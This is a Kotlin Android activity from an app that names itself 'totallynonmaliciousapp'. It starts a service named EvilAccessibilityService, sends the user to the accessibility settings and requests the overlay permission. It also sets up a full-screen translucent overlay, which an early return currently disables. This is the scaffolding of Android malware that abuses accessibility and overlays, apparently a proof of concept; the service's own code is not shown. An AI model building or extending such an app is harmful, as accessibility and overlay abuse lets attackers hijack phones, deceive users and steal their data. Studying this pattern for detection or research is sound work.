package jamil.totallynonmaliciousapp

import android.app.Activity
import android.content.Context
import android.content.Intent
import android.graphics.PixelFormat
import android.net.Uri
import android.os.Bundle
import jamil.totallynonmaliciousapp.services.EvilAccessibilityService
import android.preference.PreferenceActivity
import android.provider.Settings
import android.view.LayoutInflater
import android.view.WindowManager


class MainActivity : Activity() {

    override fun onCreate(bundle: Bundle?) {
        super.onCreate(bundle)
        val intent = Intent(this, EvilAccessibilityService::class.java)

        stopService(intent)
        startService(intent)

        openAccessibilitySettingsPage()
        requestDrawOnTop()

        finish()
    }

    private fun requestDrawOnTop() {
        if (!Settings.canDrawOverlays(this)) {
            val intent = Intent(Settings.ACTION_MANAGE_OVERLAY_PERMISSION, Uri.parse("package:$packageName"))
            startActivityForResult(intent, 251)
        } else {
            firstWindow()
        }
    }

    override fun onActivityResult(requestCode: Int, resultCode: Int, data: Intent?) {
        super.onActivityResult(requestCode, resultCode, data)

        when(requestCode) {
            251 -> {
                if (Settings.canDrawOverlays(this)) {
                    firstWindow()
                }
            }
        }
    }

    private fun openAccessibilitySettingsPage() {
        val intent = Intent(android.provider.Settings.ACTION_ACCESSIBILITY_SETTINGS)
        startActivity(intent)
    }

    private fun firstWindow() {
        return
        val layoutInflator = getSystemService(Context.LAYOUT_INFLATER_SERVICE) as LayoutInflater
        val view = layoutInflator.inflate(R.layout.accessiblity_view, null)

        val windowManager = getSystemService(Context.WINDOW_SERVICE) as WindowManager

        val metrics = resources.displayMetrics

        val windowParameters = WindowManager.LayoutParams(
            metrics.widthPixels,
            metrics.heightPixels,
            WindowManager.LayoutParams.TYPE_PHONE,
            WindowManager.LayoutParams.FLAG_WATCH_OUTSIDE_TOUCH,
            PixelFormat.TRANSLUCENT
        )

        windowManager.addView(view, windowParameters)


    }
}